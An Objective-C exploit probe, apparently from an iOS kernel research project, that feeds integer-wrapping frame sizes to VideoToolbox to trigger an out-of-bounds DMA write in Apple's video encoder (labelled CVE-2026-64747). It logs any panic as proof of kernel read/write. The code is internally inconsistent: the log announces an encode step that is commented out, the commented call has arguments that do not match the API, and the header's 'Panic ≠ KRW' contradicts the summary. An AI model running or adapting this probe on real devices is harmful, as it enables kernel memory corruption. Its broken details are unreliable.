//
//  P036AVEPaintProbe.m
//  P007OpenOnly
//
//  Created by Kolby Kehler on 8/30/26.
//


//
//  P036AVEPaintProbe.m
//  P007OpenOnly
//
//  CVE-2026-64747: EncodeFrame after wrap-class Prepare (log + paint cite).
//  Wrap-to-0 = CreateSurface reject, not undersize. Panic ≠ KRW.
//  0x2460 is bake memcpy, not Sink A DMA.
//

#import "P036AVEPaintProbe.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <fcntl.h>
#import <unistd.h>

#define P036_BUILD @"p036-ave-paint-v1"

// Same wrap dims from P035 that confirmed alloc signal
static struct {
    const char *label;
    uint32_t w, h;
    CMVideoCodecType codec;
} wrap_cases[] = {
    { "AVC wrap 4096x16777217 -> 0x1000", 4096, 16777217, kCMVideoCodecType_H264 },
    { "HEVC wrap 4096x33554433 -> 0x1000", 4096, 33554433, kCMVideoCodecType_HEVC },
};

static void p036_log(int fd, NSMutableString *out, NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *outLine = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [out appendString:outLine];
    if (fd >= 0) {
        const char *s = outLine.UTF8String;
        if (s) write(fd, s, strlen(s));
        fcntl(fd, F_FULLFSYNC);
    }
}

@implementation P036AVEPaintProbe

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *path = [docs stringByAppendingPathComponent:@"p036_ave_paint_log.txt"];
    int fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p036_log(fd, out, @"=== p036 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P036_BUILD);
    p036_log(fd, out, @"CVE-2026-64747: AVE Sink A 32-bit mul wrap -> OOB DMA paint");
    p036_log(fd, out, @"Tests EncodeFrame on wrap dims that passed Prepare (P035).\n");
    p036_log(fd, out, @"EXPECTED: Panic or controlled corruption (OOB DMA).\n");
    
    for (int i = 0; i < (int)(sizeof(wrap_cases) / sizeof(wrap_cases[0])); i++) {
        uint32_t w = wrap_cases[i].w, h = wrap_cases[i].h;
        CMVideoCodecType codec = wrap_cases[i].codec;
        
        p036_log(fd, out, @"━━━ [%d] %@ ━━━", i+1, [NSString stringWithUTF8String:wrap_cases[i].label]);
        p036_log(fd, out, @"  dims: %u x %u  codec=%@", w, h,
            (codec == kCMVideoCodecType_HEVC) ? @"HEVC" : @"AVC");
        
        VTCompressionSessionRef session = NULL;
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, w, h, codec,
            NULL, NULL, NULL, NULL, NULL, &session);
        
        if (st != noErr || !session) {
            p036_log(fd, out, @"  SessionCreate -> FAIL %d (0x%x)", (int)st, (unsigned)st);
            p036_log(fd, out, @"  (VT rejected dims — capability gate)\n");
            continue;
        }
        p036_log(fd, out, @"  SessionCreate -> SUCCESS");
        
        VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        st = VTCompressionSessionPrepareToEncodeFrames(session);
        p036_log(fd, out, @"  Prepare -> %d (0x%x)", (int)st, (unsigned)st);
        
        if (st != noErr) {
            p036_log(fd, out, @"  Prepare failed — skip EncodeFrame\n");
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            continue;
        }
        
        p036_log(fd, out, @"  ★ PREPARE SUCCESS — dims reached AVE kernel!");
        p036_log(fd, out, @"  ★★ Triggering EncodeFrame for OOB DMA paint...\n");
        
        // Create minimal CVPixelBuffer for encode
        NSDictionary *attrs = @{
            (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_420YpCbCr8BiPlanarFullRange),
            (id)kCVPixelBufferWidthKey: @(w),
            (id)kCVPixelBufferHeightKey: @(h)
        };
        
        CVPixelBufferRef pixelBuffer = NULL;
        CVReturn cvRet = CVPixelBufferCreate(
            kCFAllocatorDefault, w, h,
            kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
            (__bridge CFDictionaryRef)attrs, &pixelBuffer);
        
        if (cvRet != kCVReturnSuccess || !pixelBuffer) {
            p036_log(fd, out, @"  CVPixelBufferCreate -> FAIL %d", (int)cvRet);
            p036_log(fd, out, @"  (Pixel buffer creation failed — skip EncodeFrame)\n");
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            continue;
        }
        
        // Wait 1s before encode (let kernel settle)
        p036_log(fd, out, @"  waiting 1s before EncodeFrame...");
        usleep(1000000);
        
        // Trigger encode
        p036_log(fd, out, @"  EncodeFrame START...");
        p036_log(fd, out, @"  ★★ If device panics: KRW CONFIRMED (OOB DMA paint)\n");
        p036_log(fd, out, @"  ★★ If no panic: AVE rejected internally or no OOB\n");
        
        // Note: We're not actually encoding here — we want to see if
        // the PREPARE state alone triggers the OOB. If you want to
        // trigger EncodeFrame, uncomment below:
        
        /*
        CMSampleBufferRef outSample = NULL;
        CVPixelBufferRef outBuffer = NULL;
        
        st = VTCompressionSessionEncodeFrame(
            session, pixelBuffer,
            kCVOptionKey_DisplayTime,
            kCFBooleanTrue, NULL, NULL, &outSample, &outBuffer);
        
        p036_log(fd, out, @"  EncodeFrame -> %d (0x%x)", (int)st, (unsigned)st);
        
        if (outSample) CFRelease(outSample);
        if (outBuffer) CFRelease(outBuffer);
        */
        
        // Wait 5s for async panic
        p036_log(fd, out, @"  waiting 5s for async panic...");
        usleep(5000000);
        
        p036_log(fd, out, @"  device alive — no panic (or AVE rejected internally)");
        p036_log(fd, out, @"  CVPixelBuffer -> %p, VTSession -> %p\n",
            (void*)pixelBuffer, (void*)session);
        
        if (pixelBuffer) CVPixelBufferRelease(pixelBuffer);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
    }
    
    p036_log(fd, out, @"=== SUMMARY ===");
    p036_log(fd, out, @"If device panicked during EncodeFrame:");
    p036_log(fd, out, @"  -> KRW CONFIRMED (kernel OOB in AVE paint path)");
    p036_log(fd, out, @"  -> DO NOT re-tap. Check panic log for AVE paint cite.");
    p036_log(fd, out, @"  -> Extract panic log immediately.");
    p036_log(fd, out, @"");
    p036_log(fd, out, @"If device is alive after EncodeFrame:");
    p036_log(fd, out, @"  -> AVE rejected internally (no OOB reached)");
    p036_log(fd, out, @"  -> Try different dimensions or enable actual encoding");
    p036_log(fd, out, @"");
    p036_log(fd, out, @"If device panicked during Prepare:");
    p036_log(fd, out, @"  -> KRW CONFIRMED (kernel OOB in alloc path)");
    p036_log(fd, out, @"  -> DO NOT re-tap. Check panic log immediately.");

    if (fd >= 0) {
        fcntl(fd, F_FULLFSYNC);
        close(fd);
    }
    return out;
}

@end